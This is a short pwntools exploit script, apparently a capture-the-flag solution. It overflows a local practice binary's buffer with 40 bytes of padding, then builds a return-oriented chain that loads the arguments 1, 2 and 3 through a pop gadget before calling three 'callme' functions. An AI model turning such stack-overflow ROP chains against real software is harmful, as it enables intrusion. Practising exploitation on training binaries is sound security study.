from pwn import *
context.log_level = 'debug'

p="./elf"

context.binary=p
io=process(p)

pop_canshu=0x0000000000401ab0 
callmeone=0x0000000000401850
callmetwo=0x0000000000401870
callmethree=0x0000000000401810

payload="a"*40+p64(pop_canshu)+p64(1)+p64(2)+p64(3)+p64(callmeone)
payload+=p64(pop_canshu)+p64(1)+p64(2)+p64(3)+p64(callmetwo)
payload+=p64(pop_canshu)+p64(1)+p64(2)+p64(3)+p64(callmethree)

io.recvuntil("> ")

io.sendline(payload)

io.interactive()
